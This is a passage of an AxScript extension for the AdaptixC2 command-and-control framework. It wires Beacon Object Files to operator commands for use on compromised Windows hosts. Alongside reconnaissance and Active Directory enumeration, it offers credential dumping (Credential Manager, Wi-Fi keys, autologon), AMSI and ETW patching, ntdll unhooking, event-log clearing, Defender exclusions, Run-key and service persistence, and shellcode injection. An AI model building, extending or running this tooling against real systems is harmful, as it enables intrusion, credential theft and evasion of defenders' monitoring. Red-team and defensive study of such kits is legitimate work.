/*
 * AdaptixBOFKit - AdaptixC2 AxScript extension
 *
 * Load this file from the client: Main menu -> AxScript -> Script manager
 * -> Context menu -> Load new -> AdaptixBOFKit.axs
 *
 * The BOF objects are expected in ./_bin/<name>.<arch>.o next to this file.
 */

var metadata = {
    name: "AdaptixBOFKit",
    description: "Recon, AD, credential, evasion, persistence and utility BOFs",
    store: true
};

function bof_path(id, name) {
    return ax.script_dir() + "_bin/" + name + "." + ax.arch(id) + ".o";
}

/* ------------------------------------------------------------------ */
/* Recon / situational awareness                                       */
/* ------------------------------------------------------------------ */

var cmd_whoami = ax.create_command("bof-whoami", "Show user, SID, groups and token privileges", "bof-whoami");
cmd_whoami.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "whoami")}"`, "BOF: whoami");
});

var cmd_env = ax.create_command("bof-env", "List process environment variables", "bof-env");
cmd_env.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "env")}"`, "BOF: env");
});

var cmd_ipconfig = ax.create_command("bof-ipconfig", "Show IPv4 adapters, gateways and DNS servers", "bof-ipconfig");
cmd_ipconfig.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "ipconfig")}"`, "BOF: ipconfig");
});

var cmd_arp = ax.create_command("bof-arp", "Dump the ARP table", "bof-arp");
cmd_arp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "arp")}"`, "BOF: arp");
});

var cmd_netstat = ax.create_command("bof-netstat", "Show TCP and UDP endpoints", "bof-netstat");
cmd_netstat.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netstat")}"`, "BOF: netstat");
});

var cmd_netconn = ax.create_command("bof-netconn", "TCP/UDP endpoints with the owning PID and process", "bof-netconn");
cmd_netconn.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netconn")}"`, "BOF: netconn");
});

var cmd_routeprint = ax.create_command("bof-routeprint", "Show the IPv4 routing table", "bof-routeprint");
cmd_routeprint.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "routeprint")}"`, "BOF: routeprint");
});

var cmd_uptime = ax.create_command("bof-uptime", "Show boot time and system uptime", "bof-uptime");
cmd_uptime.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "uptime")}"`, "BOF: uptime");
});

var cmd_listpipes = ax.create_command("bof-listpipes", "List named pipes", "bof-listpipes");
cmd_listpipes.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "listpipes")}"`, "BOF: listpipes");
});

var cmd_drives = ax.create_command("bof-drives", "List logical drives with type and free space", "bof-drives");
cmd_drives.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "drives")}"`, "BOF: drives");
});

var cmd_locale = ax.create_command("bof-locale", "Show system and user locale information", "bof-locale");
cmd_locale.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "locale")}"`, "BOF: locale");
});

var cmd_resources = ax.create_command("bof-resources", "Show memory, CPU and disk resources", "bof-resources");
cmd_resources.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "resources")}"`, "BOF: resources");
});

var cmd_windowlist = ax.create_command("bof-windowlist", "List visible windows and their PIDs", "bof-windowlist");
cmd_windowlist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "windowlist")}"`, "BOF: windowlist");
});

var cmd_listmods = ax.create_command("bof-listmods", "List modules loaded in a process (0 = current)", "bof-listmods 1234");
cmd_listmods.addArgInt("pid", "Process ID (0 = current process)", 0);
cmd_listmods.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "listmods")}" ${params}`, "BOF: listmods");
});

var cmd_sessions = ax.create_command("bof-sessions", "Enumerate local and RDP sessions", "bof-sessions");
cmd_sessions.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "sessions")}"`, "BOF: sessions");
});

var cmd_dir = ax.create_command("bof-dir", "List a directory, optionally recursively", "bof-dir C:\\Windows /s");
cmd_dir.addArgString("directory", "Directory to list", ".\\");
cmd_dir.addArgBool("/s", "Recurse into subdirectories");
cmd_dir.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("wstr,int", [parsed_json["directory"], parsed_json["/s"] ? 1 : 0]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "dir")}" ${params}`, "BOF: dir");
});

var cmd_proclist = ax.create_command("bof-proclist", "List processes with PID, PPID and image path", "bof-proclist");
cmd_proclist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "proclist")}"`, "BOF: proclist");
});

var cmd_tasklist = ax.create_command("bof-tasklist", "Process list with full command lines", "bof-tasklist svchost");
cmd_tasklist.addArgString("filter", "Substring filter on image or command line", "");
cmd_tasklist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["filter"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "tasklist")}" ${params}`, "BOF: tasklist");
});

var cmd_services = ax.create_command("bof-services", "Enumerate Win32 services", "bof-services");
cmd_services.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "services")}"`, "BOF: services");
});

var cmd_drivers = ax.create_command("bof-drivers", "Enumerate kernel drivers registered with SCM", "bof-drivers");
cmd_drivers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "drivers")}"`, "BOF: drivers");
});

var cmd_driversigs = ax.create_command("bof-driversigs", "Kernel drivers with Authenticode signature status", "bof-driversigs");
cmd_driversigs.addArgString("filter", "Substring filter on service name or image path", "");
cmd_driversigs.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["filter"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "driversigs")}" ${params}`, "BOF: driversigs");
});

var cmd_wmi_query = ax.create_command("bof-wmi_query", "Run a WQL query against ROOT\\CIMV2", "bof-wmi_query \"SELECT ProcessId,Name,CommandLine FROM Win32_Process\"");
cmd_wmi_query.addArgString("query", true, "WQL query");
cmd_wmi_query.addArgString("properties", "Comma-separated property names (empty = all)", "");
cmd_wmi_query.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["query"], parsed_json["properties"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wmi_query")}" ${params}`, "BOF: wmi_query");
});

var cmd_msi_search = ax.create_command("bof-msi-search", "Installed MSI products with version and install path", "bof-msi-search chrome");
cmd_msi_search.addArgString("keyword", "Case-insensitive filter on name, publisher or path", "");
cmd_msi_search.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["keyword"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "msi-search")}" ${params}`, "BOF: msi-search");
});

/* ------------------------------------------------------------------ */
/* Network                                                             */
/* ------------------------------------------------------------------ */

var cmd_portscan = ax.create_command("bof-portscan", "TCP connect scan of an IPv4 host", "bof-portscan 192.168.1.10 22,80,443,445,3389");
cmd_portscan.addArgString("target", true, "Target IPv4 address");
cmd_portscan.addArgString("ports", true, "Ports: 80 or 80,443,22-25");
cmd_portscan.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["target"], parsed_json["ports"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "portscan")}" ${params}`, "BOF: portscan");
});

var cmd_nslookup = ax.create_command("bof-nslookup", "Query DNS records", "bof-nslookup example.com -t A -s 8.8.8.8");
cmd_nslookup.addArgString("domain", true, "Name to resolve");
cmd_nslookup.addArgFlagString("-t", "type", "Record type: A, AAAA, CNAME, MX, NS, PTR, TXT, SRV, SOA, ANY", "A");
cmd_nslookup.addArgFlagString("-s", "server", "DNS server (default: system resolver)", "");
cmd_nslookup.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["domain"], parsed_json["type"], parsed_json["server"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "nslookup")}" ${params}`, "BOF: nslookup");
});

var cmd_netshares = ax.create_command("bof-netshares", "Enumerate SMB shares on a host", "bof-netshares 192.168.1.10");
cmd_netshares.addArgString("host", "Hostname or IP (empty = localhost)", "");
cmd_netshares.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netshares")}" ${params}`, "BOF: netshares");
});

var cmd_netview = ax.create_command("bof-netview", "List computers visible in a domain", "bof-netview CORP.LOCAL");
cmd_netview.addArgString("domain", "Domain name (empty = current domain)", "");
cmd_netview.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netview")}" ${params}`, "BOF: netview");
});

var cmd_netuse = ax.create_command("bof-netuse", "Map a remote SMB share", "bof-netuse \\\\192.168.1.10\\C$ CORP\\user password");
cmd_netuse.addArgString("share", true, "UNC path, e.g. \\\\host\\share");
cmd_netuse.addArgString("user", "Username", "");
cmd_netuse.addArgString("password", "Password", "");
cmd_netuse.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["share"], parsed_json["user"], parsed_json["password"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netuse")}" ${params}`, "BOF: netuse");
});

var cmd_netuse_list = ax.create_command("bof-netuse-list", "List mapped network resources", "bof-netuse-list");
cmd_netuse_list.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netuse-list")}"`, "BOF: netuse-list");
});

var cmd_nettime = ax.create_command("bof-nettime", "Read the clock of a remote machine", "bof-nettime 192.168.1.10");
cmd_nettime.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_nettime.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "nettime")}" ${params}`, "BOF: nettime");
});

var cmd_netloggedon = ax.create_command("bof-netloggedon", "Enumerate users logged on to a machine", "bof-netloggedon 192.168.1.10");
cmd_netloggedon.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netloggedon.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netloggedon")}" ${params}`, "BOF: netloggedon");
});

var cmd_netsession = ax.create_command("bof-netsession", "Enumerate SMB sessions on a machine", "bof-netsession 192.168.1.10");
cmd_netsession.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netsession.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netsession")}" ${params}`, "BOF: netsession");
});

/* ------------------------------------------------------------------ */
/* Active Directory / accounts                                         */
/* ------------------------------------------------------------------ */

var cmd_netuser = ax.create_command("bof-netuser", "Show detailed user account information", "bof-netuser administrator CORP");
cmd_netuser.addArgString("user", true, "Username");
cmd_netuser.addArgString("domain", "Domain or server (empty = local)", "");
cmd_netuser.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["user"], parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netuser")}" ${params}`, "BOF: netuser");
});

var cmd_netlocalgroups = ax.create_command("bof-netlocalgroups", "Enumerate local groups", "bof-netlocalgroups 192.168.1.10");
cmd_netlocalgroups.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netlocalgroups.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netlocalgroups")}" ${params}`, "BOF: netlocalgroups");
});

var cmd_netlocalgroupmembers = ax.create_command("bof-netlocalgroupmembers", "Enumerate members of a local group", "bof-netlocalgroupmembers Administrators 192.168.1.10");
cmd_netlocalgroupmembers.addArgString("group", true, "Local group name");
cmd_netlocalgroupmembers.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_netlocalgroupmembers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["group"], parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netlocalgroupmembers")}" ${params}`, "BOF: netlocalgroupmembers");
});

var cmd_domaingroups = ax.create_command("bof-domaingroups", "Enumerate domain global groups", "bof-domaingroups CORP");
cmd_domaingroups.addArgString("domain", "Domain name (empty = current)", "");
cmd_domaingroups.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "domaingroups")}" ${params}`, "BOF: domaingroups");
});

var cmd_netgroupmembers = ax.create_command("bof-netgroupmembers", "Enumerate members of a domain global group", "bof-netgroupmembers Domain Admins CORP");
cmd_netgroupmembers.addArgString("group", true, "Group name");
cmd_netgroupmembers.addArgString("domain", "Domain name (empty = current)", "");
cmd_netgroupmembers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["group"], parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "netgroupmembers")}" ${params}`, "BOF: netgroupmembers");
});

var cmd_passwordpolicy = ax.create_command("bof-passwordpolicy", "Show password and lockout policy", "bof-passwordpolicy CORP");
cmd_passwordpolicy.addArgString("domain", "Domain name (empty = local)", "");
cmd_passwordpolicy.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["domain"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "passwordpolicy")}" ${params}`, "BOF: passwordpolicy");
});

var cmd_domaininfo = ax.create_command("bof-domaininfo", "Show join status, FQDN and domain controller", "bof-domaininfo");
cmd_domaininfo.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "domaininfo")}"`, "BOF: domaininfo");
});

/* ------------------------------------------------------------------ */
/* Credentials                                                         */
/* ------------------------------------------------------------------ */

var cmd_credman = ax.create_command("bof-credman", "Dump Windows Credential Manager entries", "bof-credman");
cmd_credman.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "credman")}"`, "BOF: credman");
});

var cmd_wifi = ax.create_command("bof-wifi", "List wireless profiles and recover plaintext keys", "bof-wifi");
cmd_wifi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "wifi")}"`, "BOF: wifi");
});

var cmd_autologon = ax.create_command("bof-autologon", "Read Winlogon autologon credentials from the registry", "bof-autologon");
cmd_autologon.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "autologon")}"`, "BOF: autologon");
});

/* ------------------------------------------------------------------ */
/* Privilege / evasion                                                 */
/* ------------------------------------------------------------------ */

var cmd_tokenpriv = ax.create_command("bof-tokenpriv", "List token privileges or enable one", "bof-tokenpriv SeDebugPrivilege");
cmd_tokenpriv.addArgString("privilege", "Privilege to enable (empty = list all)", "");
cmd_tokenpriv.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["privilege"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "tokenpriv")}" ${params}`, "BOF: tokenpriv");
});

var cmd_uacstatus = ax.create_command("bof-uacstatus", "Inspect UAC registry configuration", "bof-uacstatus");
cmd_uacstatus.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "uacstatus")}"`, "BOF: uacstatus");
});

var cmd_unhook = ax.create_command("bof-unhook", "Restore ntdll executable sections from disk", "bof-unhook");
cmd_unhook.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "unhook")}"`, "BOF: unhook");
});

var cmd_etwpatch = ax.create_command("bof-etwpatch", "Patch ntdll!EtwEventWrite", "bof-etwpatch");
cmd_etwpatch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "etwpatch")}"`, "BOF: etwpatch");
});

var cmd_amsipatch = ax.create_command("bof-amsipatch", "Patch amsi!AmsiScanBuffer", "bof-amsipatch");
cmd_amsipatch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "amsipatch")}"`, "BOF: amsipatch");
});

var cmd_hidefile = ax.create_command("bof-hidefile", "Mark a file or directory hidden + system", "bof-hidefile C:\\Temp\\payload.exe");
cmd_hidefile.addArgString("path", true, "File or directory path");
cmd_hidefile.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "hidefile")}" ${params}`, "BOF: hidefile");
});

var cmd_cleareventlog = ax.create_command("bof-cleareventlog", "Clear Application, System and Security logs", "bof-cleareventlog");
cmd_cleareventlog.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "cleareventlog")}"`, "BOF: cleareventlog");
});

var cmd_addexclusion = ax.create_command("bof-add-exclusion", "Add a Microsoft Defender path exclusion", "bof-add-exclusion C:\\Temp");
cmd_addexclusion.addArgString("path", true, "Path to exclude");
cmd_addexclusion.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "add-exclusion")}" ${params}`, "BOF: add-exclusion");
});

/* ------------------------------------------------------------------ */
/* Registry / persistence                                              */
/* ------------------------------------------------------------------ */

var cmd_regquery = ax.create_command("bof-regquery", "Query a registry key or value", "bof-regquery HKLM SOFTWARE\\Microsoft\\Windows\\CurrentVersion Run");
cmd_regquery.addArgString("hive", true, "HKLM, HKCU, HKCR, HKU or HKCC");
cmd_regquery.addArgString("path", true, "Key path");
cmd_regquery.addArgString("value", "Value name (empty = enumerate values)", "");
cmd_regquery.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["hive"], parsed_json["path"], parsed_json["value"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "regquery")}" ${params}`, "BOF: regquery");
});

var cmd_regset = ax.create_command("bof-regset", "Create or set a REG_SZ registry value", "bof-regset HKCU Software\\Test value data");
cmd_regset.addArgString("hive", true, "HKLM, HKCU, HKCR, HKU or HKCC");
cmd_regset.addArgString("path", true, "Key path");
cmd_regset.addArgString("value", true, "Value name");
cmd_regset.addArgString("data", true, "String data");
cmd_regset.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr,cstr", [parsed_json["hive"], parsed_json["path"], parsed_json["value"], parsed_json["data"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "regset")}" ${params}`, "BOF: regset");
});

var cmd_regdelete = ax.create_command("bof-regdelete", "Delete a registry value or empty key", "bof-regdelete HKCU Software\\Test value");
cmd_regdelete.addArgString("hive", true, "HKLM, HKCU, HKCR, HKU or HKCC");
cmd_regdelete.addArgString("path", true, "Key path");
cmd_regdelete.addArgString("value", "Value name (empty = delete key)", "");
cmd_regdelete.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr,cstr", [parsed_json["hive"], parsed_json["path"], parsed_json["value"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "regdelete")}" ${params}`, "BOF: regdelete");
});

var cmd_runkey = ax.create_command("bof-runkey", "Add HKCU Run key persistence", "bof-runkey Updater C:\\Users\\Public\\updater.exe");
cmd_runkey.addArgString("name", true, "Value name");
cmd_runkey.addArgString("command", true, "Command to run at logon");
cmd_runkey.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["name"], parsed_json["command"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "runkey")}" ${params}`, "BOF: runkey");
});

var cmd_svccreate = ax.create_command("bof-svc-create", "Create and start a Windows service", "bof-svc-create Updater C:\\Users\\Public\\updater.exe");
cmd_svccreate.addArgString("name", true, "Service name");
cmd_svccreate.addArgString("path", true, "Binary path");
cmd_svccreate.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["name"], parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "svc-create")}" ${params}`, "BOF: svc-create");
});

var cmd_svcdelete = ax.create_command("bof-svc-delete", "Delete a Windows service", "bof-svc-delete Updater");
cmd_svcdelete.addArgString("name", true, "Service name");
cmd_svcdelete.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["name"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "svc-delete")}" ${params}`, "BOF: svc-delete");
});

/* ------------------------------------------------------------------ */
/* Execution / post exploitation                                       */
/* ------------------------------------------------------------------ */

var cmd_inject = ax.create_command("bof-inject", "Inject raw shellcode from a local file", "bof-inject 1234 C:\\Temp\\payload.bin");
cmd_inject.addArgInt("pid", true, "Target process ID");
cmd_inject.addArgString("path", true, "Local shellcode file on the target");
cmd_inject.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("int,cstr", [parsed_json["pid"], parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "inject")}" ${params}`, "BOF: inject");
});

var cmd_hashfile = ax.create_command("bof-hashfile", "Hash a file (MD5, SHA1 or SHA256)", "bof-hashfile C:\\Windows\\System32\\ntdll.dll -a sha256");
cmd_hashfile.addArgString("path", true, "File path");
cmd_hashfile.addArgFlagString("-a", "algo", "Algorithm: md5, sha1 or sha256", "sha256");
cmd_hashfile.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr,cstr", [parsed_json["path"], parsed_json["algo"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "hashfile")}" ${params}`, "BOF: hashfile");
});

var cmd_download = ax.create_command("bof-download", "Download a file via AxDownloadMemory (built-in download is chunked and preferred)", "bof-download C:\\Temp\\output.txt");
cmd_download.addArgString("path", true, "Remote file path");
cmd_download.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["path"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "download")}" ${params}`, "BOF: download");
});

/* ------------------------------------------------------------------ */
/* Extended catalog coverage                                           */
/* ------------------------------------------------------------------ */

var cmd_useridletime = ax.create_command("bof-useridletime", "Seconds since the last user input in this session", "bof-useridletime");
cmd_useridletime.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "useridletime")}"`, "BOF: useridletime");
});

var cmd_sessioninfo = ax.create_command("bof-sessioninfo", "Current logon session details from LSA", "bof-sessioninfo");
cmd_sessioninfo.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "sessioninfo")}"`, "BOF: sessioninfo");
});

var cmd_regqueryrec = ax.create_command("bof-regqueryrec", "Recursively dump a registry key", "bof-regqueryrec HKLM SOFTWARE\\Microsoft\\Windows\\CurrentVersion 2");
cmd_regqueryrec.addArgString("hive", true, "Hive: HKLM, HKCU, HKU, HKCR, HKCC");
cmd_regqueryrec.addArgString("path", true, "Key path");
cmd_regqueryrec.addArgInt("depth", "Maximum recursion depth", 3);
cmd_regqueryrec.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr,cstr,int", [parsed_json["hive"], parsed_json["path"], parsed_json["depth"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "regqueryrec")}" ${params}`, "BOF: regqueryrec");
});

var cmd_auditpol = ax.create_command("bof-auditpol", "Show advanced audit policy subcategories", "bof-auditpol");
cmd_auditpol.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "auditpol")}"`, "BOF: auditpol");
});

var cmd_findmodule = ax.create_command("bof-findmodule", "Find processes that have a DLL loaded", "bof-findmodule csagent.dll");
cmd_findmodule.addArgString("module", true, "Module name or path substring");
cmd_findmodule.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["module"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "findmodule")}" ${params}`, "BOF: findmodule");
});

var cmd_filterdrivers = ax.create_command("bof-filterdrivers", "List filesystem minifilter drivers", "bof-filterdrivers");
cmd_filterdrivers.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "filterdrivers")}"`, "BOF: filterdrivers");
});

var cmd_scenum = ax.create_command("bof-scenum", "Service details or a full service table", "bof-scenum WinDefend");
cmd_scenum.addArgString("service", "Service name (empty = list all)", "");
cmd_scenum.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["service"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "scenum")}" ${params}`, "BOF: scenum");
});

var cmd_regsession = ax.create_command("bof-regsession", "Loaded user hives from HKEY_USERS", "bof-regsession");
cmd_regsession.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "regsession")}"`, "BOF: regsession");
});

var cmd_edrrecon = ax.create_command("bof-edrrecon", "Match services/drivers against known EDR and AV names", "bof-edrrecon");
cmd_edrrecon.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "edrrecon")}"`, "BOF: edrrecon");
});

var cmd_enumsysmon = ax.create_command("bof-enumsysmon", "Detect Sysmon service, driver and configuration", "bof-enumsysmon");
cmd_enumsysmon.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumsysmon")}"`, "BOF: enumsysmon");
});

var cmd_enumwebclient = ax.create_command("bof-enumwebclient", "Check the WebClient (WebDAV) service", "bof-enumwebclient 192.168.1.10");
cmd_enumwebclient.addArgString("host", "Hostname or IP (empty = local)", "");
cmd_enumwebclient.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["host"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumwebclient")}" ${params}`, "BOF: enumwebclient");
});

var cmd_whereami = ax.create_command("bof-whereami", "OPSEC-safe process/session context", "bof-whereami");
cmd_whereami.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "whereami")}"`, "BOF: whereami");
});

var cmd_enumrwx = ax.create_command("bof-enumrwx", "List RWX memory regions in a process", "bof-enumrwx 1234");
cmd_enumrwx.addArgInt("pid", "Process ID (0 = current process)", 0);
cmd_enumrwx.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("int", [parsed_json["pid"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "enumrwx")}" ${params}`, "BOF: enumrwx");
});

var cmd_vulndrivers = ax.create_command("bof-vulndrivers", "Flag installed drivers with known-vulnerable names", "bof-vulndrivers");
cmd_vulndrivers.setPreHook(function (id, cmdline) {
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "vulndrivers")}"`, "BOF: vulndrivers");
});

var cmd_enumdotnet = ax.create_command("bof-enumdotnet", "Processes with the CLR loaded", "bof-enumdotnet");
cmd_enumdotnet.setPreHook(function (id, cmdline) {
